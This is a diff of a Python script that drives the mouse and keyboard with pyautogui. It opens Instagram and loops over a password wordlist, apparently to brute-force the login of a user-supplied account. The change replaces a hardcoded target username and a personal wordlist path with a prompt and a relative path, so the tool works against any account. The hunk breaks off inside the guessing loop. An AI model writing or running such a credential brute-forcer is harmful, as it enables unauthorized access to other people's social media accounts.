@@ -1,7 +1,7 @@
 import pyautogui as pg
 import webbrowser
 import time 
-user = "c.dega"
+user = input("Insert the User name: ")
 print("REMEMBER TO EXIT OF ANY ACCOUNT LOGGED ON THIS DEVICE")
 for i in range(0,4):
     print("EXECUTING IN " + str(i)+ "...")
@@ -22,7 +22,7 @@ print(""" _______      ___    ___ _______   ________  ___  ___  _________  ___  
 time.sleep(5)
 webbrowser.open("www.instagram.com")
 time.sleep(10)
-f = open( r"C:\Users\ASUS\OneDrive\Desktop\Tools\wordlist.txt.txt" )
+f = open( r"wordlist.txt" )
 cont = 0
 for word in f:
     pg.moveTo(1300,380)
